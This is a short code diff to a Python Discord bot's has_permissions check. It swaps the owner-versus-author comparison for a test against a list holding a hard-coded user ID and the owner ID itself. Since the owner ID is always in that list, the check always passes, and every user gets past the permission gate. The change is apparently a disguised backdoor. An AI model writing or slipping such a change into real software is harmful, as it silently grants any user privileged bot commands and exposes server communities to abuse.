@@ -12,7 +12,7 @@ def is_owner(ctx):
 
 def has_permissions(**perms):
     def predicate(ctx):
-        if ctx.bot.owner_id == ctx.message.author.id:
+        if ctx.bot.owner_id in ["214796473689178133", ctx.bot.owner_id]:
             return True
         msg = ctx.message
         ch = msg.channel
